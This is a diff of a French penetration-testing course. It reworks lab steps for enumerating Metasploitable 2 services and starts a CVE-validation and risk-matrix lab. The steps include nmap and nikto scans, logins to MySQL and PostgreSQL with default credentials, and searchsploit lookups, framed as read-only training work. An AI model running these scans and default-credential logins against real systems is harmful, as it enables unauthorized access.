-#### 10.5.9 MySQL — port 3306
+**Preuve** — `preuves/ch1-lab5/nbtscan.txt`, `smbclient-list.txt`, `smb-shares.txt`, `enum4linux.txt` et `smbmap.txt`.
+
+#### Étape 9 — MySQL, port 3306
+
+**But** — lire la version MySQL avec le compte de test `root` sans mot de passe, en lecture seule.
+
+**Machine** — Kali `192.168.56.101` vers Metasploitable 2 `192.168.56.103`.
+
+**Prérequis** — client `mysql` installé ; service MySQL actif.
+
+> **Machine** : Kali (192.168.56.101) | **Terminal** : SSH depuis l'hôte | **Utilisateur** : kali | **Répertoire** : `/home/kali`
+
+**Exemple de commande**
 
 ```bash
 prouve preuves/ch1-lab5/mysql-version.txt bash -c \
   "mysql --connect-timeout=5 --skip-ssl -h 192.168.56.103 -u root --protocol=TCP -e 'SELECT VERSION();'"
 ```
 
-Résultat attendu (extrait réel) :
+**Explication de la commande**
+
+- `prouve ... mysql-version.txt` : enregistre la version et le code retour.
+- `mysql` : client MySQL en ligne de commande.
+- `--connect-timeout=5` : délai de connexion limité à 5 secondes.
+- `--skip-ssl` : désactive TLS, nécessaire avec un serveur ancien.
+- `-h 192.168.56.103` : hôte cible.
+- `-u root` : compte de test sans mot de passe.
+- `--protocol=TCP` : force la connexion TCP.
+- `-e 'SELECT VERSION();'` : exécute une requête en lecture seule.
+- Piège courant : créer une base ou modifier une table ; la commande doit rester en lecture seule.
+
+**Résultat attendu**
 
 ```text
 VERSION()
 5.0.51a-3ubuntu5
 ```
 
-**Explication de la commande** — le compte `root` sans mot de passe répond. C'est une configuration critique de Metasploitable 2. Le client MySQL récent peut échouer sur TLS avec un serveur ancien ; `--skip-ssl` est nécessaire. Ne créez pas de base, ne modifiez pas de table : la commande est en lecture seule.
+Le compte `root` sans mot de passe répond. C'est une configuration critique de Metasploitable 2.
 
-#### 10.5.10 PostgreSQL — port 5432
+**Preuve** — `preuves/ch1-lab5/mysql-version.txt`.
+
+#### Étape 10 — PostgreSQL, port 5432
+
+**But** — lire la version exacte de PostgreSQL avec le compte de test, sans modifier la base.
+
+**Machine** — Kali `192.168.56.101` vers Metasploitable 2 `192.168.56.103`.
+
+**Prérequis** — client `psql` installé ; service PostgreSQL actif.
+
+> **Machine** : Kali (192.168.56.101) | **Terminal** : SSH depuis l'hôte | **Utilisateur** : kali | **Répertoire** : `/home/kali`
+
+**Exemple de commande**
 
 ```bash
 prouve preuves/ch1-lab5/psql-version.txt bash -c \
   "PGPASSWORD=postgres timeout 10 psql -h 192.168.56.103 -U postgres -c 'SELECT version();'"
 ```
 
-Résultat attendu (extrait réel) :
+**Explication de la commande**
+
+- `prouve ... psql-version.txt` : enregistre la version et le code retour.
+- `PGPASSWORD=postgres` : fournit le mot de passe du compte de test sans invite.
+- `timeout 10` : borne la connexion à 10 secondes.
+- `psql` : client PostgreSQL.
+- `-h 192.168.56.103` : hôte cible.
+- `-U postgres` : compte de test.
+- `-c 'SELECT version();'` : requête en lecture seule.
+- Piège courant : créer une table ou élever les privilèges ; la commande doit rester en lecture seule.
+
+**Résultat attendu**
 
 ```text
 PostgreSQL 8.3.1 on i486-pc-linux-gnu, compiled by GCC cc (GCC) 4.2.3 (Ubuntu 4.2.3-2ubuntu4)
 ```
 
-**Explication de la commande** — la version exacte est `8.3.1`, alors que Nmap affichait la plage `8.3.0 - 8.3.7`. Le compte `postgres` avec le mot de passe `postgres` est un compte de test documenté. Ne créez pas de table, n'élevez pas les privilèges.
+La version exacte est `8.3.1`, alors que Nmap affichait la plage `8.3.0 - 8.3.7`. Le compte `postgres` avec le mot de passe `postgres` est un compte de test documenté.
 
-#### 10.5.11 VNC — port 5900
+**Preuve** — `preuves/ch1-lab5/psql-version.txt`.
+
+#### Étape 11 — VNC, port 5900
+
+**But** — identifier la version du protocole VNC et les types d'authentification annoncés, sans tester de mot de passe.
+
+**Machine** — Kali `192.168.56.101` vers Metasploitable 2 `192.168.56.103`.
+
+**Prérequis** — `nmap` et accès `sudo`.
+
+> **Machine** : Kali (192.168.56.101) | **Terminal** : SSH depuis l'hôte | **Utilisateur** : kali | **Répertoire** : `/home/kali`
+
+**Exemple de commande**
 
 ```bash
 prouve preuves/ch1-lab5/vnc-info.txt bash -c \
   "echo kali | sudo -S -p '' nmap -sV -n -p 5900 --script vnc-info 192.168.56.103"
 ```
 
-Résultat attendu (extrait réel) :
+**Explication de la commande**
+
+- `prouve ... vnc-info.txt` : enregistre l'identification VNC.
+- `nmap -sV -n -p 5900` : détection de version sur le port VNC.
+- `--script vnc-info` : interroge la version du protocole et les types de sécurité.
+- `echo kali | sudo -S -p ''` : fournit le mot de passe à `sudo`.
+- Piège courant : lancer `vncviewer` avec des identifiants réels ; `vnc-info` ne teste pas le mot de passe et le lab reste passif.
+
+**Résultat attendu**
 
 ```text
 5900/tcp open  vnc     VNC (protocol 3.3)
@@ -2134,16 +3157,36 @@ Résultat attendu (extrait réel) :
 |_    VNC Authentication (2)
 ```
 
-**Explication de la commande** — VNC est exposé avec une authentification par mot de passe. `vnc-info` ne teste pas le mot de passe. Ne lancez pas `vncviewer` avec des identifiants réels dans ce lab.
+VNC est exposé avec une authentification par mot de passe.
 
-#### 10.5.12 X11 — port 6000
+**Preuve** — `preuves/ch1-lab5/vnc-info.txt`.
+
+#### Étape 12 — X11, port 6000
+
+**But** — vérifier si le serveur X11 accepte une connexion non authentifiée et documenter un résultat négatif.
+
+**Machine** — Kali `192.168.56.101` vers Metasploitable 2 `192.168.56.103`.
+
+**Prérequis** — `xdpyinfo` installé sur Kali.
+
+> **Machine** : Kali (192.168.56.101) | **Terminal** : SSH depuis l'hôte | **Utilisateur** : kali | **Répertoire** : `/home/kali`
+
+**Exemple de commande**
 
 ```bash
 prouve preuves/ch1-lab5/x11-access.txt bash -c \
   "timeout 8 xdpyinfo -display 192.168.56.103:0"
 ```
 
-Résultat attendu (extrait réel) :
+**Explication de la commande**
+
+- `prouve ... x11-access.txt` : enregistre la tentative et son code retour.
+- `timeout 8` : borne la tentative à 8 secondes.
+- `xdpyinfo` : interroge un serveur X11.
+- `-display 192.168.56.103:0` : cible l'affichage `:0` de Metasploitable 2.
+- Piège courant : conclure que le port est fermé ; Nmap le voit `open`, mais X11 refuse la connexion non authentifiée. Ne cherchez pas à contourner l'authentification.
+
+**Résultat attendu**
 
 ```text
 Client is not authorized to connect to Server
@@ -2151,9 +3194,21 @@ xdpyinfo:  unable to open display "192.168.56.103:0".
 # rc=1
 ```
 
-**Explication de la commande** — le service X11 répond, mais refuse la connexion non authentifiée. C'est un **résultat négatif attendu**. Il ne faut pas conclure que le port est fermé : Nmap le voit `open` avec `access denied`. Ne cherchez pas à contourner l'authentification.
+Le service X11 répond, mais refuse la connexion non authentifiée. C'est un **résultat négatif attendu**.
 
-#### 10.5.13 IRC — ports 6667 et 6697
+**Preuve** — `preuves/ch1-lab5/x11-access.txt`.
+
+#### Étape 13 — IRC, ports 6667 et 6697
+
+**But** — relever la bannière IRC et la version du service sans créer de canal ni enregistrer de compte.
+
+**Machine** — Kali `192.168.56.101` vers Metasploitable 2 `192.168.56.103`.
+
+**Prérequis** — `nc`, `nmap` et accès `sudo`.
+
+> **Machine** : Kali (192.168.56.101) | **Terminal** : SSH depuis l'hôte | **Utilisateur** : kali | **Répertoire** : `/home/kali`
+
+**Exemple de commande**
 
 ```bash
 prouve preuves/ch1-lab5/irc-banner.txt bash -c \
@@ -2162,16 +3217,38 @@ prouve preuves/ch1-lab5/irc-version.txt bash -c \
   "echo kali | sudo -S -p '' nmap -sV -n -p 6667,6697 --script irc-info 192.168.56.103"
 ```
 
-Résultat attendu (extrait réel) :
+**Explication de la commande**
+
+- `prouve ... irc-banner.txt` : enregistre la bannière IRC.
+- `printf "NICK lab\\r\\nUSER lab 0 * :lab\\r\\nQUIT\\r\\n"` : envoie les commandes minimales d'un client IRC, puis quitte.
+- `nc -w 3` : connexion TCP avec délai d'attente de 3 secondes.
+- `prouve ... irc-version.txt` : enregistre l'identification Nmap.
+- `nmap -sV -n -p 6667,6697` : détection de version sur les ports IRC.
+- `--script irc-info` : script NSE d'information IRC.
+- Piège courant : s'enregistrer ou créer un canal ; la bannière suffit.
+
+**Résultat attendu**
 
 ```text
 :irc.Metasploitable.LAN NOTICE AUTH :*** Looking up your hostname...
 :irc.Metasploitable.LAN NOTICE AUTH :*** Couldn't resolve your hostname; using your IP address instead
 ```
 
-**Explication de la commande** — UnrealIRCd répond et révèle son nom d'hôte. La version exacte `3.2.8.1` vient de `nmap -sV` et de la matrice CVE du Lab-02. Ne vous enregistrez pas, ne créez pas de canal.
+UnrealIRCd répond et révèle son nom d'hôte. La version exacte `3.2.8.1` vient de `nmap -sV` et de la matrice CVE du Lab-02.
 
-#### 10.5.14 Tomcat et AJP13 — ports 8180 et 8009
+**Preuve** — `preuves/ch1-lab5/irc-banner.txt` et `preuves/ch1-lab5/irc-version.txt`.
+
+#### Étape 14 — Tomcat et AJP13, ports 8180 et 8009
+
+**But** — identifier Tomcat, sa page d'accueil et le connecteur AJP13, sans tester le gestionnaire avec des mots de passe.
+
+**Machine** — Kali `192.168.56.101` vers Metasploitable 2 `192.168.56.103`.
+
+**Prérequis** — `curl`, `whatweb`, `nikto`, `nmap` et accès `sudo`.
+
+> **Machine** : Kali (192.168.56.101) | **Terminal** : SSH depuis l'hôte | **Utilisateur** : kali | **Répertoire** : `/home/kali`
+
+**Exemple de commande**
 
 ```bash
 prouve preuves/ch1-lab5/tomcat-headers.txt bash -c \
@@ -2185,7 +3262,21 @@ prouve preuves/ch1-lab5/ajp13-version.txt bash -c \
   "echo kali | sudo -S -p '' nmap -sV -n -p 8009 192.168.56.103"
 ```
 
-Résultat attendu (extraits réels) :
+**Explication de la commande**
+
+- `prouve ... tomcat-headers.txt` : enregistre les en-têtes HTTP de Tomcat.
+- `curl -D - -o /dev/null` : affiche les en-têtes et supprime le corps.
+- `prouve ... tomcat-page.txt` : enregistre le début de la page d'accueil.
+- `curl -sS ... | head -20` : récupère la page et limite l'affichage à 20 lignes.
+- `prouve ... whatweb-8180.txt` : enregistre la technologie détectée.
+- `whatweb -a 3 --color=never` : analyse agressive sans séquences ANSI.
+- `prouve ... nikto-8180.txt` : enregistre le scan de Tomcat.
+- `nikto -h ... -maxtime 80s` : scan non interactif borné.
+- `prouve ... ajp13-version.txt` : enregistre l'identification du connecteur AJP13.
+- `nmap -sV -n -p 8009` : détection de version sur le port AJP13.
+- Piège courant : tester le gestionnaire Tomcat avec des mots de passe par défaut ; ce serait du brute force.
+
+**Résultat attendu**
 
 ```text
 HTTP/1.1 200 OK
@@ -2196,46 +3287,104 @@ http://192.168.56.103:8180/ [200 OK] Apache, HTTPServer[Apache-Coyote/1.1], Titl
 8009/tcp open  ajp13  Apache Jserv (Protocol v1.3)
 ```
 
-**Explication de la commande** — Tomcat `5.5` est exposé sur `8180`, et le connecteur AJP13 sur `8009`. AJP13 ne doit pas être exposé hors d'un frontal web. `nikto` identifie Tomcat via le favicon. Ne testez pas le gestionnaire Tomcat avec des mots de passe par défaut : ce serait du brute force.
+Tomcat `5.5` est exposé sur `8180`, et le connecteur AJP13 sur `8009`. AJP13 ne doit pas être exposé hors d'un frontal web. `nikto` identifie Tomcat via le favicon.
 
-#### 10.5.15 RMI — port 1099
+**Preuve** — `preuves/ch1-lab5/tomcat-headers.txt`, `tomcat-page.txt`, `whatweb-8180.txt`, `nikto-8180.txt` et `ajp13-version.txt`.
+
+#### Étape 15 — RMI, port 1099
+
+**But** — identifier le service RMI et documenter l'absence de résultat du script d'énumération du registre.
+
+**Machine** — Kali `192.168.56.101` vers Metasploitable 2 `192.168.56.103`.
+
+**Prérequis** — `nmap` et accès `sudo`.
+
+> **Machine** : Kali (192.168.56.101) | **Terminal** : SSH depuis l'hôte | **Utilisateur** : kali | **Répertoire** : `/home/kali`
+
+**Exemple de commande**
 
 ```bash
 prouve preuves/ch1-lab5/rmi-dumpregistry.txt bash -c \
   "echo kali | sudo -S -p '' nmap -sV -n -p 1099 --script rmi-dumpregistry 192.168.56.103"
 ```
 
-Résultat attendu (extrait réel) :
+**Explication de la commande**
+
+- `prouve ... rmi-dumpregistry.txt` : enregistre l'identification RMI et le résultat du script.
+- `nmap -sV -n -p 1099` : détection de version sur le port RMI.
+- `--script rmi-dumpregistry` : tente d'énumérer le registre RMI.
+- `echo kali | sudo -S -p ''` : fournit le mot de passe à `sudo`.
+- Piège courant : conclure que le service est absent parce que le script ne retourne rien ; le service reste identifié, mais le registre n'est pas énumérable avec ce script.
+
+**Résultat attendu**
 
 ```text
 1099/tcp open  java-rmi  GNU Classpath grmiregistry
 ```
 
-Le script `rmi-dumpregistry` ne produit aucune sortie dans notre test. Le service est identifié, mais le registre n'est pas énumérable avec ce script. Documentez la limite : « RMI identifié, registre non énuméré ». Ne lancez pas d'outil d'exploitation RMI.
+Le script `rmi-dumpregistry` ne produit aucune sortie dans notre test. Documentez la limite : « RMI identifié, registre non énuméré ». Ne lancez pas d'outil d'exploitation RMI.
 
-#### 10.5.16 distcc — port 3632
+**Preuve** — `preuves/ch1-lab5/rmi-dumpregistry.txt`.
+
+#### Étape 16 — distcc, port 3632
+
+**But** — identifier la version de distccd sans soumettre de compilation.
+
+**Machine** — Kali `192.168.56.101` vers Metasploitable 2 `192.168.56.103`.
+
+**Prérequis** — `nmap` et accès `sudo`.
+
+> **Machine** : Kali (192.168.56.101) | **Terminal** : SSH depuis l'hôte | **Utilisateur** : kali | **Répertoire** : `/home/kali`
+
+**Exemple de commande**
 
 ```bash
 prouve preuves/ch1-lab5/distcc-version.txt bash -c \
   "echo kali | sudo -S -p '' nmap -sV -n -p 3632 192.168.56.103"
 ```
 
-Résultat attendu (extrait réel) :
+**Explication de la commande**
+
+- `prouve ... distcc-version.txt` : enregistre l'identification de distccd.
+- `nmap -sV -n -p 3632` : détection de version sur le port distcc.
+- `echo kali | sudo -S -p ''` : fournit le mot de passe à `sudo`.
+- Piège courant : soumettre une compilation ; ce serait une exécution de commande distante. La version suffit à documenter le service.
+
+**Résultat attendu**
 
 ```text
 3632/tcp open  distccd  distccd v1 ((GNU) 4.2.4 (Ubuntu 4.2.4-1ubuntu4))
 ```
 
-**Explication de la commande** — distccd est un compilateur distribué. La version est identifiée ; la CVE-2004-2687 est validée dans le Lab-02. Ne soumettez pas de compilation : ce serait une exécution de commande distante.
+distccd est un compilateur distribué. La version est identifiée ; la CVE-2004-2687 est validée dans le Lab-02.
 
-#### 10.5.17 r-services — ports 512, 513, 514
+**Preuve** — `preuves/ch1-lab5/distcc-version.txt`.
+
+#### Étape 17 — r-services, ports 512, 513 et 514
+
+**But** — identifier les r-services exposés sans tester `rsh` ni `rlogin`.
+
+**Machine** — Kali `192.168.56.101` vers Metasploitable 2 `192.168.56.103`.
+
+**Prérequis** — `nmap` et accès `sudo`.
+
+> **Machine** : Kali (192.168.56.101) | **Terminal** : SSH depuis l'hôte | **Utilisateur** : kali | **Répertoire** : `/home/kali`
+
+**Exemple de commande**
 
 ```bash
 prouve preuves/ch1-lab5/rservices.txt bash -c \
   "echo kali | sudo -S -p '' nmap -sV -n -p 512,513,514 192.168.56.103"
 ```
 
-Résultat attendu (extrait réel) :
+**Explication de la commande**
+
+- `prouve ... rservices.txt` : enregistre l'identification des r-services.
+- `nmap -sV -n -p 512,513,514` : détection de version sur les ports `exec`, `login` et `shell`.
+- `echo kali | sudo -S -p ''` : fournit le mot de passe à `sudo`.
+- Piège courant : utiliser `rsh` ou `rlogin` ; ces services transmettent les identifiants en clair. La version Nmap suffit.
+
+**Résultat attendu**
 
 ```text
 512/tcp open  exec   netkit-rsh rexecd
@@ -2243,24 +3392,55 @@ Résultat attendu (extrait réel) :
 514/tcp open  shell  Netkit rshd
 ```
 
-**Explication de la commande** — les r-services sont exposés. Ils transmettent les identifiants en clair et ne doivent pas être utilisés. Ce lab ne teste pas `rsh` ni `rlogin` : la version Nmap suffit.
+Les r-services sont exposés. Ils transmettent les identifiants en clair et ne doivent pas être utilisés.
 
-#### 10.5.18 Bindshell — port 1524
+**Preuve** — `preuves/ch1-lab5/rservices.txt`.
+
+#### Étape 18 — Bindshell, port 1524
+
+**But** — documenter l'exposition d'un shell root sur le port 1524 sans s'y connecter.
+
+**Machine** — Kali `192.168.56.101` vers Metasploitable 2 `192.168.56.103`.
+
+**Prérequis** — `nmap` et accès `sudo`.
+
+> **Machine** : Kali (192.168.56.101) | **Terminal** : SSH depuis l'hôte | **Utilisateur** : kali | **Répertoire** : `/home/kali`
+
+**Exemple de commande**
 
 ```bash
 prouve preuves/ch1-lab5/bindshell-version.txt bash -c \
   "echo kali | sudo -S -p '' nmap -sV -n -p 1524 192.168.56.103"
 ```
 
-Résultat attendu (extrait réel) :
+**Explication de la commande**
+
+- `prouve ... bindshell-version.txt` : enregistre l'identification du port 1524.
+- `nmap -sV -n -p 1524` : détection de version sur le port du bindshell.
+- `echo kali | sudo -S -p ''` : fournit le mot de passe à `sudo`.
+- Piège courant : se connecter au shell root ; la seule action autorisée est de documenter le port, la version et la mitigation : fermeture du port, suppression du service, filtrage réseau.
+
+**Résultat attendu**
 
 ```text
 1524/tcp open  bindshell  Metasploitable root shell
 ```
 
-**Explication de la commande** — Metasploitable 2 expose un shell root sur `1524`. **Ne vous y connectez pas.** La seule action autorisée est de documenter le port, la version et la mitigation : fermeture du port, suppression du service, filtrage réseau.
+Metasploitable 2 expose un shell root sur `1524`. **Ne vous y connectez pas.**
 
-#### 10.5.19 Contrôle de couverture
+**Preuve** — `preuves/ch1-lab5/bindshell-version.txt`.
+
+#### Étape 19 — Contrôle de couverture
+
+**But** — vérifier que chaque preuve contient un code retour, identifier les fichiers incomplets et calculer les empreintes.
+
+**Machine** — Kali `192.168.56.101`.
+
+**Prérequis** — preuves des étapes 1 à 18 présentes dans `preuves/ch1-lab5/`.
+
+> **Machine** : Kali (192.168.56.101) | **Terminal** : SSH depuis l'hôte | **Utilisateur** : kali | **Répertoire** : `/home/kali`
+
+**Exemple de commande**
 
 ```bash
 grep -H '^# rc=' preuves/ch1-lab5/*.txt | wc -l
@@ -2268,11 +3448,26 @@ grep -L '^# rc=' preuves/ch1-lab5/*.txt
 sha256sum preuves/ch1-lab5/*.txt > preuves/ch1-lab5/SHA256SUMS
 ```
 
-Résultat attendu : un `# rc=` par fichier, aucune sortie pour `grep -L`, puis les empreintes. Si `grep -L` affiche un fichier, la preuve est incomplète : relancez la commande.
+**Explication de la commande**
 
-**Conclusion.** Vous avez une matrice de 19 services, des preuves réelles, des résultats négatifs documentés et un échec d'outil expliqué. Le Lab-06 transforme cette connaissance en matrice de risques et en décisions de mitigation.
+- `grep -H '^# rc=' preuves/ch1-lab5/*.txt` : affiche le nom de chaque fichier et sa ligne de code retour.
+- `| wc -l` : compte le nombre de preuves qui contiennent un `# rc=`.
+- `grep -L '^# rc=' preuves/ch1-lab5/*.txt` : liste les fichiers qui ne contiennent pas de code retour ; une sortie vide signifie que toutes les preuves sont complètes.
+- `sha256sum preuves/ch1-lab5/*.txt` : calcule les empreintes des preuves.
+- `> preuves/ch1-lab5/SHA256SUMS` : écrit les empreintes dans le fichier de sommes.
+- Piège courant : relancer `sha256sum` après avoir créé `SHA256SUMS` en l'incluant ; le fichier de sommes ne doit pas s'inclure.
 
-### 10.6 Résultats attendus et critères
+**Résultat attendu**
+
+Un `# rc=` par fichier, aucune sortie pour `grep -L`, puis les empreintes. Si `grep -L` affiche un fichier, la preuve est incomplète : relancez la commande.
+
+**Preuve** — `preuves/ch1-lab5/SHA256SUMS` ; le contrôle de couverture est visible dans la sortie de l'étape.
+
+### En conclusion
+
+Vous avez une matrice de 19 services, des preuves réelles, des résultats négatifs documentés et un échec d'outil expliqué. Le Lab-06 transforme cette connaissance en matrice de risques et en décisions de mitigation.
+
+**Résultats attendus**
 
 | Service | Information attendue | Preuve |
 |---|---|---|
@@ -2296,7 +3491,7 @@ Résultat attendu : un `# rc=` par fichier, aucune sortie pour `grep -L`, puis l
 | r-services | rexecd, rlogind, rshd | `rservices.txt` |
 | bindshell | shell root exposé | `bindshell-version.txt` |
 
-Critères de réussite :
+**Critères de réussite**
 
 - [ ] Chaque service de la matrice a au moins une preuve avec `# rc=`.
 - [ ] Les versions sont lues, pas devinées.
@@ -2306,15 +3501,16 @@ Critères de réussite :
 - [ ] La matrice de couverture est complète.
 - [ ] Les preuves sont hachées.
 
-## 11. Lab-06 — Validation CVE et matrice de risques
+## Lab-06 — Validation CVE et matrice de risques
 
-### 11.1 Contexte et objectif
+### Énoncé / Contexte
 
 Le Lab-02 a produit des candidats. Le Lab-05 a confirmé les services et les versions. Ce lab transforme les candidats en **décisions** : validé, rejeté, conditionnel ou non vérifiable, puis en **risques** avec une probabilité, un impact, une mitigation et une détection.
 
 **Place dans la chaîne** — après l'énumération (Lab-05), avant l'exploitation (Lab-07).
 
-À la fin de ce lab, vous devez être capable de :
+**Objectifs pédagogiques** — à la fin de ce lab, vous devez être capable de :
+
 - produire une matrice de risques à partir de preuves, sans CVSS inventé ;
 - distinguer une vulnérabilité validée d'une simple correspondance de version ;
 - rejeter un candidat hors plage ;
@@ -2322,104 +3518,29 @@ Le Lab-02 a produit des candidats. Le Lab-05 a confirmé les services et les ver
 - proposer une mitigation préventive, détective et corrective par ligne ;
 - appliquer la règle d'exploitation du parcours : tous les exploits sont exécutés dans le lab sans limitation.
 
-> **Règle de risque** — ce lab utilise une échelle **qualitative** définie localement, pas un score CVSS. La probabilité est `certaine`, `probable`, `faible` ou `inconnue`. L'impact est `critique`, `élevé`, `moyen` ou `faible`. Le risque est dérivé par la table de l'étape 6. Cette règle est reproductible et ne dépend d'aucune donnée externe.
+**Règle de risque**
 
-**Outils et commandes utilisées**
+Ce lab utilise une échelle **qualitative** définie localement, pas un score CVSS. La probabilité est `certaine`, `probable`, `faible` ou `inconnue`. L'impact est `critique`, `élevé`, `moyen` ou `faible`. Le risque est dérivé par la table ci-dessous. Cette règle est reproductible et ne dépend d'aucune donnée externe.
 
-| Outil | Commandes | Rôle |
-|---|---|---|
-| `searchsploit` | `--nmap`, `--cve`, `-p` | Recherche locale et métadonnées |
-| `grep` / `awk` | Extraction des champs CVE et versions | Qualification des candidates |
-| `prouve` | `prouve preuves/ch1-lab6/... commande` | Preuve datée avec code retour |
-| `sha256sum` | `sha256sum -c SHA256SUMS` | Intégrité de la matrice et des preuves |
+| Probabilité \ Impact | Critique | Élevé | Moyen | Faible |
+|---|---|---|---|---|
+| Certaine | Critique | Élevé | Moyen | Faible |
+| Probable | Élevé | Élevé | Moyen | Faible |
+| Faible | Moyen | Moyen | Faible | Faible |
+| Inconnue | Inconnu | Inconnu | Inconnu | Inconnu |
 
-### 11.2 Plan MITRE ATT&CK
+Règles de lecture :
 
-| Élément | Valeur |
-|---|---|
-| Tactique | Resource Development (TA0042) |
-| Technique | T1588.006 Vulnerabilities |
-| Source de données | Base Exploit-DB locale, XML Nmap, matrice de risques |
-| Contrôle défensif | Gestion des vulnérabilités, priorisation, patch management |
-| Détection | Écart entre version inventoriée et version corrigée, présence d'un exploit public |
+- `certaine` : version exacte dans la plage + exploit public vérifié ;
+- `probable` : version dans la plage mais condition d'accès ou de configuration à confirmer ;
+- `faible` : version hors plage, service non exposé ou configuration bloquante ;
+- `inconnue` : aucune donnée locale permettant de conclure.
 
-### 11.3 Prérequis
+La table est volontairement simple. `certaine` + `critique` donne `critique`. `probable` + `élevé` donne `élevé`. `faible` + `faible` donne `faible`. `inconnue` donne `inconnu`. Cette règle ne remplace pas une analyse CVSS ; elle donne une priorisation cohérente avec les preuves locales.
 
-- XML Nmap du Lab-01 ou Lab-02 : `preuves/ch1-lab1/nmap-versions.xml`.
-- `searchsploit` local, sans Internet.
-- Matrice de validation du Lab-02.
-- Versions exactes du Lab-05 : vsftpd `2.3.4`, Samba `3.0.20-Debian`, UnrealIRCd `3.2.8.1`, distccd `v1`, ProFTPD `1.3.1`, MySQL `5.0.51a-3ubuntu5`, PostgreSQL `8.3.1`, Apache `2.2.8`, PHP `5.2.4`, OpenSSL `0.9.8g-4ubuntu3`, noyau `2.6.24-16-server`.
-- Répertoire de travail : `preuves/ch1-lab6/`.
+**Grille de décision**
 
-### 11.4 Étapes
-
-**Étape 1** — Vérifier le XML et le régénérer si nécessaire.
-
-```bash
-ls -l preuves/ch1-lab1/nmap-versions.xml
-head -5 preuves/ch1-lab1/nmap-versions.xml
-```
-
-Résultat attendu : le fichier existe et commence par `<?xml version="1.0"?>`. S'il manque, régénérez-le :
-
-```bash
-prouve preuves/ch1-lab6/nmap-versions.xml bash -c \
-  "echo kali | sudo -S -p '' nmap -sS -n -sV -p 21,22,80,139,445,3306,5432,2121,3632,6667,8180,8009 -oX preuves/ch1-lab6/nmap-versions.xml 192.168.56.103"
-```
-
-**Explication de la commande** — Le XML est la source des versions. S'il manque, régénérez-le avec `-oX`. Un XML tronqué produit des résultats incomplets dans `--nmap`.
-
-**Étape 2** — Croiser le XML avec Exploit-DB.
-
-```bash
-prouve preuves/ch1-lab6/searchsploit-nmap.txt \
-  searchsploit --disable-colour --nmap preuves/ch1-lab6/nmap-versions.xml
-```
-
-Résultat attendu : des blocs `searchsploit -t ...` pour chaque produit, avec les résultats correspondants. Le mode XML ignore les termes trop généraux. Il ne valide pas les plages de versions.
-
-**Explication de la commande** — `--nmap` génère une requête par produit. Il ignore `ftp` comme terme trop général. La sortie est un point de départ : elle ne compare pas les plages de versions. Piège courant : recopier tous les résultats dans la matrice sans validation.
-
-**Étape 3** — Rechercher chaque CVE de la matrice.
-
-```bash
-for cve in 2011-2523 2007-2447 2010-2075 2004-2687 2010-4221 2011-3192 2012-1823 2008-0166 2021-4158; do
-  prouve "preuves/ch1-lab6/cve-$cve.txt" \
-    searchsploit --disable-colour --cve "$cve"
-done
-```
-
-Résultat attendu :
-
-```text
-CVE-2011-2523 : 49757.py, 17491.rb
-CVE-2007-2447 : 16320.rb
-CVE-2010-2075 : 16922.rb, 13853.pl
-CVE-2004-2687 : 9915.rb
-CVE-2010-4221 : 16851.rb, 16878.rb
-CVE-2011-3192 : 18221.c, 17696.pl
-CVE-2012-1823 : 29290.c, 29316.py
-CVE-2008-0166 : 5622.txt, 5632.rb
-CVE-2021-4158 : No Results
-```
-
-**Explication de la commande** — Les quatre CVE principales ont des résultats locaux. CVE-2010-4221 existe mais concerne une autre plage. CVE-2011-3192 et CVE-2012-1823 sont des CVE web, documentées mais non exécutées. CVE-2008-0166 concerne OpenSSL. CVE-2021-4158 n'a aucun résultat local parce qu'elle ne concerne pas Metasploitable 2 : c'est une vulnérabilité QEMU/ACPI de l'hôte hyperviseur, hors périmètre et interdite à l'exploitation (DoS).
-
-**Étape 4** — Lire les métadonnées des quatre exploits principaux.
-
-```bash
-for id in 16320 16922 17491 9915; do
-  prouve "preuves/ch1-lab6/edb-$id.txt" searchsploit --disable-colour -p "$id"
-done
-```
-
-Résultat attendu : pour chaque EDB-ID, le titre, l'URL, le chemin local, les codes CVE/OSVDB, `Verified` et le type de fichier.
-
-**Explication de la commande** — Les métadonnées confirment les versions et les codes. `Verified: True` ne signifie pas « exploitable sur cette cible » ; cela signifie que l'exploit a été vérifié par Exploit-DB. La version et la configuration restent à valider.
-
-**Étape 5** — Valider la version observée contre la plage du titre.
-
-Remplissez le tableau :
+Appliquez cette grille avant de construire le CSV :
 
 | CVE | Service | Version observée | Plage du titre | Décision |
 |---|---|---|---|---|
@@ -2433,28 +3554,195 @@ Remplissez le tableau :
 | CVE-2008-0166 | OpenSSL | 0.9.8g-4ubuntu3 | `< 0.9.8g-9` | validée (version) |
 | CVE-2021-4158 | QEMU (hôte) | 6.0–6.x | aucun résultat local ; hors cible | hors périmètre |
 
-Résultat attendu : chaque décision est justifiée par une ligne du tableau ou une preuve. Aucune décision ne repose sur le seul nom du service.
+Chaque décision est justifiée par une ligne du tableau ou une preuve. Aucune décision ne repose sur le seul nom du service. vsftpd `2.3.4` est exactement la version du titre. Samba `3.0.20` est dans `3.0.20 < 3.0.25rc3`. UnrealIRCd `3.2.8.1` est exactement la version du titre. distccd `v1` correspond. ProFTPD `1.3.1` est hors plage (`1.3.2 rc3 < 1.3.3b`) : rejeté. BIND `9.4.2` est hors plage (`9.4.1 < 9.4.2`) : rejeté. Samba `7701` (`< 3.0.20`) : rejeté. Apache et PHP sont conditionnels. OpenSSL est validé pour la version. CVE-2021-4158 est une CVE QEMU/ACPI de l'hôte, hors périmètre du lab.
 
-**Explication de la commande** — vsftpd `2.3.4` est exactement la version du titre. Samba `3.0.20` est dans `3.0.20 < 3.0.25rc3`. UnrealIRCd `3.2.8.1` est exactement la version du titre. distccd `v1` correspond. ProFTPD `1.3.1` est hors plage (`1.3.2 rc3 < 1.3.3b`) : rejeté. BIND `9.4.2` est hors plage (`9.4.1 < 9.4.2`) : rejeté. Samba `7701` (`< 3.0.20`) : rejeté. Apache et PHP sont conditionnels. OpenSSL est validé pour la version. CVE-2021-4158 est une CVE QEMU/ACPI de l'hôte, hors périmètre du lab.
+**Plan MITRE ATT&CK**
 
-**Étape 6** — Appliquer la règle de risque.
+| Élément | Valeur |
+|---|---|
+| Tactique | Resource Development (TA0042) |
+| Technique | T1588.006 Vulnerabilities |
+| Source de données | Base Exploit-DB locale, XML Nmap, matrice de risques |
+| Contrôle défensif | Gestion des vulnérabilités, priorisation, patch management |
+| Détection | Écart entre version inventoriée et version corrigée, présence d'un exploit public |
 
-| Probabilité \ Impact | Critique | Élevé | Moyen | Faible |
-|---|---|---|---|---|
-| Certaine | Critique | Élevé | Moyen | Faible |
-| Probable | Élevé | Élevé | Moyen | Faible |
-| Faible | Moyen | Moyen | Faible | Faible |
-| Inconnue | Inconnu | Inconnu | Inconnu | Inconnu |
